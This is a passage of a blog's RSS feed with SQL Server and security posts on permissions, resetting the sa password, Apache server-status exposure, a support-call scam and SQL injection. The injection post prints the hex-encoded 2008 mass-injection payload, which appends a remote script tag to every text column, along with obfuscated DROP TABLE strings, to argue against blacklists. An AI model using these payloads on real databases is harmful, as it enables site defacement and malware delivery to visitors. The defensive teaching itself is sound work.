+<p>Msg 3701, Level 14, State 20, Procedure prTest, Line 3<br />
+Cannot alter the procedure &#8216;prTest&#8217;, because it does not exist or you do not have permission.</p>
+<p>Execute the following in the window where you have all the permissions</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">GRANT</span> <span class="kw1">ALTER</span> <span class="kw1">ON</span> prTest <span class="kw1">TO</span> TestUser</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">GRANT ALTER ON prTest TO TestUser</pre></div></div>
+
+<p>Now run this again in the window where you are logged in as TestUser</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">ALTER</span> <span class="kw1">PROC</span> prTest
+<span class="kw1">AS</span>
+<span class="kw1">SELECT</span> <span class="kw2">GETDATE</span><span class="br0">&#40;</span><span class="br0">&#41;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">ALTER PROC prTest
+AS
+SELECT GETDATE()</pre></div></div>
+
+<p>As you now saw, this succeeded.</p>
+<p>You can also take away privileges, execute the following in the window where you have all the permissions.</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">REVOKE</span> <span class="kw1">ALTER</span> <span class="kw1">ON</span> prTest &nbsp;<span class="kw1">TO</span> TestUser</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">REVOKE ALTER ON prTest  TO TestUser</pre></div></div>
+
+<p>Now when you try to alter the stored procedure again it will fail. </p>
+<p>Here is the other way to give permissions, I like the other syntax better, it is shorter and there are no double colon characters</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">GRANT</span> <span class="kw1">ALTER</span> &nbsp;<span class="kw1">ON</span> <span class="kw1">OBJECT</span>::prTest <span class="kw1">TO</span> TestUser</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">GRANT ALTER  ON OBJECT::prTest TO TestUser</pre></div></div>
+
+<p>Now trying to modify the stored procedure will work again.</p>
+<p>There you have it, it is simple to give users access to modify only the stored procedures that you want, no need to give elevated  privileges that might bite you in the butt down the road</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/dbadmin/mssqlserveradmin/giving-users-the-ability-to/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>How to change the SA password in SQL Server</title>
+		<link>/index.php/datamgmt/datadesign/how-to-change-the-sa/</link>
+		<comments>/index.php/datamgmt/datadesign/how-to-change-the-sa/#comments</comments>
+		<pubDate>Tue, 22 May 2012 12:14:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Data Modelling and Design]]></category>
+		<category><![CDATA[Database Administration]]></category>
+		<category><![CDATA[Database Programming]]></category>
+		<category><![CDATA[Microsoft SQL Server]]></category>
+		<category><![CDATA[Microsoft SQL Server Admin]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[sql server 2005]]></category>
+		<category><![CDATA[sql server 2008]]></category>
+
+		<guid isPermaLink="false">/index.php/2012/05/how-to-change-the-sa/</guid>
+		<description><![CDATA[There was a question today How to change my local sql server sa password? i would like to expand on my answer in this post
+
+Before I start I would like you to read this post by ted Krueger first: To SA or not to SA to understand why you should not be&#8230;]]></description>
+				<content:encoded><![CDATA[<p>There was a question today <a href="http://stackoverflow.com/questions/10703150/how-to-change-my-local-sql-server-sa-password">How to change my local sql server sa password?</a> i would like to expand on my answer in this post</p>
+<p>Before I start I would like you to read this post by ted Krueger first: <a href="/index.php/DataMgmt/DBAdmin/to-sa-or-not-to-sa">To SA or not to SA</a> to understand why you should not be using the SA account.</p>
+<p>Now that you know why you should not be using the SA account and you are still using it, let&#8217;s see how you can change the password for the SA account</p>
+<p>The easiest way is to login to the server as sa or any other account that has sufficient privileges to change the sa account</p>
+<p>here is what the script looks like</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">USE</span> <span class="br0">&#91;</span>master<span class="br0">&#93;</span>
+GO
+<span class="kw1">ALTER</span> LOG<span class="sy0">IN</span> <span class="br0">&#91;</span>sa<span class="br0">&#93;</span> <span class="kw1">WITH</span> PASSW<span class="sy0">OR</span>D<span class="sy0">=</span>N<span class="st0">'NewPassword'</span>
+GO</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">USE [master]
+GO
+ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'
+GO</pre></div></div>
+
+<p>Most likely you will get this error<br />
+Msg 15118, Level 16, State 1, Line 1<br />
+Password validation failed. The password does not meet Windows policy requirements because it is not complex enough.</p>
+<p>There are two things you can do, the smarter thing would be to pick a complex password with some digits and some characters that are not alphanumeric. Or you can shoot yourself in the foot by turning the check off</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">USE</span> <span class="br0">&#91;</span>master<span class="br0">&#93;</span>
+GO
+<span class="kw1">ALTER</span> LOG<span class="sy0">IN</span> <span class="br0">&#91;</span>sa<span class="br0">&#93;</span> <span class="kw1">WITH</span> PASSW<span class="sy0">OR</span>D<span class="sy0">=</span>N<span class="st0">'NewPassword'</span>, CHECK_POLICY <span class="sy0">=</span><span class="kw1">OFF</span>
+GO</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">USE [master]
+GO
+ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword', CHECK_POLICY =OFF
+GO</pre></div></div>
+
+<p>Now try to login. It is possible that the sa account is disabled, you will see the following message</p>
+<p>Login failed for user &#8216;sa&#8217;. Reason: The account is disabled. (Microsoft SQL Server, Error: 18470)</p>
+<p>To enable the account, all you have to do is the following</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">ALTER</span> LOG<span class="sy0">IN</span> <span class="br0">&#91;</span>sa<span class="br0">&#93;</span> ENABLE
+GO</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">ALTER LOGIN [sa] ENABLE
+GO</pre></div></div>
+
+<p><strong>You do not need to restart the SQL Server service for a password change</strong>. One of the myths that you will hear is that you need to restart SQL Server. When you change from SQL authentication to mixed authentication and vice versa, you do need to restart for the changes to take effect but for a password change it is immediate, no need for a restart!</p>
+<p>And if you are old school, you can also do the following, thanks to <a href="http://sqlblog.com/blogs/aaron_bertrand/default.aspx">Aaron Bertrand</a> for this</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">EXEC</span> <span class="kw3">sp_password</span> N<span class="st0">'old password'</span>, N<span class="st0">'new password'</span>, N<span class="st0">'sa'</span>;</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">EXEC sp_password N'old password', N'new password', N'sa';</pre></div></div>
+
+<p>You can also do all of this from SSMS with the GUI, navigate to the security folder, right click on the sa account, select properties and you will see the following window</p>
+<div class="image_block"><a href="/wp-content/uploads/blogs/DataMgmt/Denis/saChangePassword-1.PNG?mtime=1337695861"><img alt="Change sa password in sql server" src="/wp-content/uploads/blogs/DataMgmt/Denis/saChangePassword-1.PNG?mtime=1337695861" width="686" height="616" /></a></div>
+<p>Click on the Status page to enable or disable the account</p>
+<p>I would encourage you to use T-SQL not the GUI, the day (and I promise you this will happen) will come that sql server will be installed on a box without the tools (Sever core perhaps) and you can only connect to it from the command line with osql, you will be stuck if you don&#8217;t know how to do this with T-SQL</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/datadesign/how-to-change-the-sa/feed/</wfw:commentRss>
+		<slash:comments>6</slash:comments>
+		</item>
+		<item>
+		<title>Please don&#8217;t use blacklists, use parameterized queries or stored procs instead</title>
+		<link>/index.php/datamgmt/datadesign/please-don-t-use-blacklists/</link>
+		<comments>/index.php/datamgmt/datadesign/please-don-t-use-blacklists/#respond</comments>
+		<pubDate>Thu, 05 Apr 2012 10:55:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Data Modelling and Design]]></category>
+		<category><![CDATA[Database Programming]]></category>
+		<category><![CDATA[IBM DB2]]></category>
+		<category><![CDATA[Microsoft SQL Server]]></category>
+		<category><![CDATA[MySQL]]></category>
+		<category><![CDATA[best practices]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[sql injection]]></category>
+
+		<guid isPermaLink="false">/index.php/2012/04/please-don-t-use-blacklists/</guid>
+		<description><![CDATA[Every now and then you will hear how some site will use a blacklist to 'protect' themselves against sql injection. Using a blacklist is very foolish because you can't ever think of all the different ways that the bad guys will try to bypass your little&#8230;]]></description>
+				<content:encoded><![CDATA[<p>Every now and then you will hear how some site will use a blacklist to &#8216;protect&#8217; themselves against sql injection. Using a blacklist is very foolish because you can&#8217;t ever think of all the different ways that the bad guys will try to bypass your little list.<br />
+Let&#8217;s say you have DROP and DROP TABLE in your list.</p>
+<p>What about these two</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">PRINT</span> <span class="kw2">REVERSE</span><span class="br0">&#40;</span><span class="st0">'tset ELBAT PORD'</span><span class="br0">&#41;</span>
+<span class="kw1">PRINT</span> <span class="kw1">convert</span><span class="br0">&#40;</span><span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">100</span><span class="br0">&#41;</span>,0x44524F50205441424C4520746573740000000000<span class="br0">&#41;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">PRINT REVERSE('tset ELBAT PORD')
+PRINT convert(VARCHAR(100),0x44524F50205441424C4520746573740000000000)</pre></div></div>
+
+<p>Change PRINT to EXEC() and both will result in DROP TABLE Test</p>
+<p>Remember this one?</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="de1"><pre class="de1">&nbsp;<span class="kw1">DECLARE</span> @S <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">4000</span><span class="br0">&#41;</span>;<span class="kw1">SET</span> @S<span class="sy0">=</span><span class="kw1">CAST</span><span class="br0">&#40;</span>0x4445434C415245204054205641524348415228323535292C40432056415243484152283235
+3529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420
+612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73
+206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E
+78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F522062
+2E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046
+524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F
+5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D2053455420
+5B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B4043
+2B275D29292B27273C736372697074207372633D687474703A2F2F7777772E63686B626E722E636F6D2F
+622E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F43
+7572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445
+414C4C4F43415445205461626C655F437572736F7220 <span class="kw1">AS</span> <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">4000</span><span class="br0">&#41;</span><span class="br0">&#41;</span>;<span class="kw1">print</span> @S;</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse"> DECLARE @S VARCHAR(4000);SET @S=CAST(0x4445434C415245204054205641524348415228323535292C40432056415243484152283235
+3529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420
+612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73
+206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E
+78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F522062
+2E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046
+524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F
+5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D2053455420
+5B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B4043
+2B275D29292B27273C736372697074207372633D687474703A2F2F7777772E63686B626E722E636F6D2F
+622E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F43
+7572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445
+414C4C4F43415445205461626C655F437572736F7220 AS VARCHAR(4000));print @S;</pre></div></div>
+
+<p>That becomes this</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">DECLARE</span> @T <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">255</span><span class="br0">&#41;</span>,@C <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">255</span><span class="br0">&#41;</span> 
+<span class="kw1">DECLARE</span> Table_Cursor <span class="kw1">CURSOR</span> <span class="kw1">FOR</span> <span class="kw1">SELECT</span> a.<span class="me1">name</span>,b.<span class="me1">name</span> 
+<span class="kw1">FROM</span> sysobjects a,syscolumns b 
+<span class="kw1">WHERE</span> a.<span class="me1">id</span><span class="sy0">=</span>b.<span class="me1">id</span> <span class="sy0">AND</span> a.<span class="me1">xtype</span><span class="sy0">=</span><span class="st0">'u'</span> <span class="sy0">AND</span> <span class="br0">&#40;</span>b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">99</span> <span class="sy0">OR</span> b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">35</span> <span class="sy0">OR</span> b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">231</span> <span class="sy0">OR</span> b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">167</span><span class="br0">&#41;</span> 
+<span class="kw1">OPEN</span> Table_Cursor 
+&nbsp; &nbsp; <span class="kw1">FETCH</span> <span class="kw1">NEXT</span> <span class="kw1">FROM</span> Table_Cursor <span class="kw1">INTO</span> @T,@C 
+&nbsp; &nbsp; <span class="kw1">WHILE</span><span class="br0">&#40;</span><span class="kw2">@@FETCH_STATUS</span><span class="sy0">=</span><span class="nu0">0</span><span class="br0">&#41;</span> 
+&nbsp; &nbsp; <span class="kw1">BEGIN</span> 
+<span class="co1">--I changed EXEC to PRINT, just in case you are foolish enough to run this</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">PRINT</span><span class="br0">&#40;</span><span class="st0">'UPDATE ['</span><span class="sy0">+</span>@T<span class="sy0">+</span><span class="st0">'] SET ['</span><span class="sy0">+</span>@C<span class="sy0">+</span><span class="st0">']=RTRIM(CONVERT(VARCHAR(4000),['</span><span class="sy0">+</span>@C<span class="sy0">+</span><span class="st0">']))+'</span><span class="st0">'&lt;script src=http://SomeFakeSite&gt;&lt;/script&gt;'</span><span class="st0">''</span><span class="br0">&#41;</span> 
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">FETCH</span> <span class="kw1">NEXT</span> <span class="kw1">FROM</span> Table_Cursor <span class="kw1">INTO</span> @T,@C 
+&nbsp; &nbsp; <span class="kw1">END</span> 
+<span class="kw1">CLOSE</span> Table_Cursor <span class="kw1">DEALLOCATE</span> Table_Cursor </pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">DECLARE @T VARCHAR(255),@C VARCHAR(255) 
+DECLARE Table_Cursor CURSOR FOR SELECT a.name,b.name 
+FROM sysobjects a,syscolumns b 
+WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) 
+OPEN Table_Cursor 
+	FETCH NEXT FROM Table_Cursor INTO @T,@C 
+	WHILE(@@FETCH_STATUS=0) 
+	BEGIN 
+--I changed EXEC to PRINT, just in case you are foolish enough to run this
+		PRINT('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''&lt;script src=http://SomeFakeSite&gt;&lt;/script&gt;''') 
+		FETCH NEXT FROM Table_Cursor INTO @T,@C 
+	END 
+CLOSE Table_Cursor DEALLOCATE Table_Cursor </pre></div></div>
+
+<p>That infected millions of pages in 2008, there are still variants of this one today. A blacklist won&#8217;t help you in this case.</p>
+<p>You can also protect yourself against this attack by denying SELECT permissions on the sysobjects table, your website user should not have access to these tables in general. If you use stored procedures you can just give access to the stored procedures and nothing else.</p>
+<p>Every web framework today offers a way to use parameterized queries and or stored procedures. There is really no excuse to fall victim to a SQL injection attack these days. </p>
+<p>Even using an ORM like Hibernate or Entity Framework is protected against SQL Injection because it use sp_executesql with proper parameters behind the scenes.</p>
+<p>If you do use stored procedures, you might still have a problem if you are using dynamic SQL inside the proc with EXEC and concatenation instead of sp_executesql with proper parameters</p>
+<p>So why do people start out by using code that is prone to SQL injection? I think there are two parts to this. </p>
+<ol>
+<li>It is easier to debug and see what is contained in the string by doing a debug.write/response.write now you can see exactly what is being sent to the DB</li>
+<li>There are still books/online examples around that show code that concatenate user input with SQL</li>
+</ol>
+<p>Whenever I see code like this when a person asks for help, I immediately tell that person his code is vulnerable to a SQL injection attack, it is my duty to alert this person, it is yours too, we need to educate these people</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/datadesign/please-don-t-use-blacklists/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Is your Apache Server Status wide open for the world to see?</title>
+		<link>/index.php/sysadmins/os/windows/2003server/is-your-apache-server-status/</link>
+		<comments>/index.php/sysadmins/os/windows/2003server/is-your-apache-server-status/#comments</comments>
+		<pubDate>Thu, 22 Mar 2012 22:34:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[2003 Server]]></category>
+		<category><![CDATA[apache]]></category>
+		<category><![CDATA[security]]></category>
+
+		<guid isPermaLink="false">/index.php/2012/03/is-your-apache-server-status/</guid>
+		<description><![CDATA[The Apache web server comes with something called Apache Module mod_status installed
+
+From the Apache site: http://httpd.apache.org/docs/2.0/mod/mod_status.html
+The Status module allows a server administrator to find out how well their server is perf&#8230;]]></description>
+				<content:encoded><![CDATA[<p>The Apache web server comes with something called Apache Module mod_status installed</p>
+<p>From the Apache site: http://httpd.apache.org/docs/2.0/mod/mod_status.html</p>
+<blockquote><p>The Status module allows a server administrator to find out how well their server is performing. A HTML page is presented that gives the current server statistics in an easily readable form. If required this page can be made to automatically refresh (given a compatible browser). Another page gives a simple machine-readable list of the current server state.</p>
+<p>The details given are:</p>
+<p>The number of worker serving requests<br />
+The number of idle worker<br />
+The status of each worker, the number of requests that worker has performed and the total number of bytes served by the worker (*)<br />
+A total number of accesses and byte count served (*)<br />
+The time the server was started/restarted and the time it has been running for<br />
+Averages giving the number of requests per second, the number of bytes served per second and the average number of bytes per request (*)<br />
+The current percentage CPU used by each worker and in total by Apache (*)<br />
+The current hosts and requests being processed (*)</p></blockquote>
+<p>If you go to a site that uses the Apache web server, you can get interesting info if you add server-status after the domain name</p>
+<p>If you go to http://apache.org/server-status, you will get the following</p>
+<p>Server Version: Apache/2.4.1 (Unix) OpenSSL/1.0.0g<br />
+Server Built: Mar 3 2012 19:35:24<br />
+Current Time: Friday, 23-Mar-2012 00:20:33 UTC<br />
+Restart Time: Tuesday, 20-Mar-2012 16:36:59 UTC<br />
+Parent Server Config. Generation: 4<br />
+Parent Server MPM Generation: 3<br />
+Server uptime: 2 days 7 hours 43 minutes 34 seconds<br />
+Total accesses: 41598844 &#8211; Total Traffic: 571.4 GB<br />
+CPU Usage: u1734.41 s1457.05 cu0 cs0 &#8211; 1.59% CPU load<br />
+207 requests/sec &#8211; 2.9 MB/second &#8211; 14.4 kB/request<br />
+24 requests currently being processed, 616 idle workers</p>
+<p>This will be followed by a list of IP addresses and pages that were served.</p>
+<p>This can potentially be dangerous, it doesn&#8217;t long to write a program that will crawl the web and checking if it gets anything back when hitting domains with server-status appended</p>
+<p>Several high traffic site have this enabled, just hit http://www.washingtonpost.com/ or http://boston.com/ and add server-status</p>
+<p>What do you think, is this a problem or meh? I think it could be a problem, attackers now can now if you have an unpatched version of Apache running and they can take advantage of that.</p>
+<p><strong>Edit</strong><br />
+And it seems that washingtonpost.com disabled it. As of this morning you see this instead</p>
+<p><em>Forbidden</p>
+<p>You don&#8217;t have permission to access /server-status on this server.</p>
+<p>Apache Server at failover.washingtonpost.com Port 80</em></p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/sysadmins/os/windows/2003server/is-your-apache-server-status/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>Don&#8217;t fall for the social engineering scam that makes you go to ammyy.com</title>
+		<link>/index.php/sysadmins/security/don-t-fall-for-the/</link>
+		<comments>/index.php/sysadmins/security/don-t-fall-for-the/#comments</comments>
+		<pubDate>Sun, 18 Sep 2011 12:10:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[2003 Server]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Windows]]></category>
+		<category><![CDATA[Windows 7]]></category>
+		<category><![CDATA[XP]]></category>
+		<category><![CDATA[scam]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[social engineering]]></category>
+
+		<guid isPermaLink="false">/index.php/2011/09/don-t-fall-for-the/</guid>
+		<description><![CDATA[I am pretty sure that none of our readers would fall for this social engineering scam that would make you share your computer with someone else, I am writing about it because I know of one person who had a call like this but she luckily hung up.
+
+I he&#8230;]]></description>
+				<content:encoded><![CDATA[<p>I am pretty sure that none of our readers would fall for this social engineering scam that would make you share your computer with someone else, I am writing about it because I know of one person who had a call like this but she luckily hung up.</p>
+<p>I heard about this on Twit&#8217;s <a href="http://twit.tv/sn">Security Now</a>( With Steve Gibson and Leo Laporte ). Here is how it works, you will get a call from someone based in India working for Microsoft telling you that your computer is infected. The first thing they do is tell you to go to start/run box, type <em>eventvwr </em>and it will bring up Windows Event Viewer. Now they have you go to the aplication folder and look at all the errors that are there, this is because the computer is infected. </p>
+<p>Of course everyone that has been using windows for a while will know that it will always have errors.</p>
+<p>The next part is pretty funny&#8230;.</p>
+<p>They will tell you to go back to the Run box and type &#8220;inf&#8221;, then they will tell you that inf stands for <strong>infected files</strong>.  They make you go to C:Windowsinf After you are there they will ask you if you can you see a lot of .inf and .pnf files in the INF directory. If you say yes, and you will, they will tell you that those are corrupted files. Next they will tell you to double-click one of the PNF files.  Once you double-click it, you will see an error message like the one below</p>
+<div class="image_block"><a href="/wp-content/uploads/blogs/All/pnffile.PNG?mtime=1326496203"><img alt="" src="/wp-content/uploads/blogs/All/pnffile.PNG?mtime=1326496203" width="412" height="252" /></a></div>
+<p>This, they will tell you is proof that your machine is infected.</p>
+<p>After that they will tell you that to fix it you need to do the following. Go to the Run box and type www.ammyy.com. Ammyy Admin &#8211; is a popular config-zero free remote desktop sharing software. It&#8217;s used for system administration, webinars and instant remote desktop access. So next they will take over your system by using this tool</p>
+<p>Here is a also a video that someone recorded</p>
+[video:youtube:cueN1-2lANA]
+<p>So if you or any of the people you know get any of these calls, just tell them to hung up.</p>
+<p><strong>Update</strong> Microsoft dumps partner over support call scam, see here: http://www.pcpro.co.uk/news/370054/microsoft-dumps-partner-over-support-call-scam</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/sysadmins/security/don-t-fall-for-the/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>SQL Injection Pocket Reference for MySQL, SQL Server and Oracle</title>
+		<link>/index.php/datamgmt/datadesign/sql-injection-pocket-reference-for/</link>
+		<comments>/index.php/datamgmt/datadesign/sql-injection-pocket-reference-for/#comments</comments>
+		<pubDate>Fri, 29 Jul 2011 08:51:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Data Modelling and Design]]></category>
+		<category><![CDATA[Database Programming]]></category>
+		<category><![CDATA[Microsoft SQL Server]]></category>
+		<category><![CDATA[Microsoft SQL Server Admin]]></category>
+		<category><![CDATA[MySQL]]></category>
+		<category><![CDATA[MySQL Admin]]></category>
+		<category><![CDATA[Oracle]]></category>
+		<category><![CDATA[Oracle Admin]]></category>
+		<category><![CDATA[mysql]]></category>
+		<category><![CDATA[oracle]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[sql injection]]></category>
+		<category><![CDATA[sql server]]></category>
+
+		<guid isPermaLink="false">/index.php/2011/07/sql-injection-pocket-reference-for/</guid>
+		<description><![CDATA[There is a nice SQL Injection Pocket Reference up on Google Docs
+
+Here is what is covered
+
+MySQL
+Default Databases
+Comment Out Query
+Testing Injection
+Strings
+Numeric
+In a login
+Testing Version
+MySQL-specific code
+Database Credentials
+Data&#8230;]]></description>
+				<content:encoded><![CDATA[<p>There is a nice <a href="https://docs.google.com/Doc?docid=0AZNlBave77hiZGNjanptbV84Z25yaHJmMjk&amp;pli=1#Allowed_Intermediary_Character_30801873723976314">SQL Injection Pocket Reference</a> up on Google Docs</p>
+<p>Here is what is covered</p>
+<p><strong>MySQL</strong><br />
+Default Databases<br />
+Comment Out Query<br />
+Testing Injection<br />
+Strings<br />
+Numeric<br />
+In a login<br />
+Testing Version<br />
+MySQL-specific code<br />
+Database Credentials<br />
+Database Names<br />
+Tables &amp; Columns<br />
+Finding out number of columns<br />
+Retrieving Tables<br />
+Retrieving Columns<br />
+PROCEDURE ANALYSE()<br />
+Retrieving Multiple Tables/Columns at once<br />
+Find Tables from Column Name<br />
